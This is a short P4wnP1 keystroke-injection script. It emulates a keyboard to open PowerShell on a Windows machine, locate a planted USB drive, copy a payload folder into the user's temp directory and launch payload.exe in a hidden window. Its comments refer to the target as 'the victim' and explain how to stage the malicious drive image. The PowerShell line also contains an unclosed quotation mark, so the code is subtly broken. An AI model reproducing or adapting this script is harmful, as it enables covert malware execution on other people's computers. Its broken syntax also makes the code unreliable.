// this script is meant to be used with a payload that is served via the Mass Storage function of the P4wnP1
// you need to explicitly activate this feature in the USB settings -> Mass Storage
// Copy the stuff that you want via SCP to the Pi
// Use /usr/local/P4wnP1/helper/genimg to generate an img file of your folder you just copied
// genimg -i /your/folder -o myimage -l USBDrive
// this will use /your/folder to create myimage.img at /usr/local/P4wnP1/ums/flashdrive and name the mounted device USBDrive so we can reference it

typingSpeed(0,0); // set typing speed
layout("de"); //set keyboard layout according to the language variable (if this command is ommited, the current layout is used)
press('GUI r');
delay(500);
type('powershell\n');
delay(1000);
// We now check all disks available and search for our "USBDrive"
// create the path to fetch whatever we want from our Drive to the victim disk at the user's temp folder
// finally execute the payload.exe from the temp folder on disk
type("$usb = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.VolumeName -eq 'USBDrive' -and $_.DriveType -eq 2 }; if ($usb) { $src=Join-Path $usb.DeviceID 'path\\toyour\\payloadfolder; $dst=Join-Path $env:TEMP 'payloadfolder'; if (Test-Path $src) { if (Test-Path $dst) { Remove-Item $dst -Recurse -Force }; Copy-Item $src -Destination $dst -Recurse; Write-Host \"Copied to $dst\"; Start-Process \"$dst\\payload.exe\" -WindowStyle Hidden} else { Write-Host \"Source folder not found.\" } } else { Write-Host \"USBDrive not found.\" }\n");
delay(500);
type('[Environment]::Exit(0)')
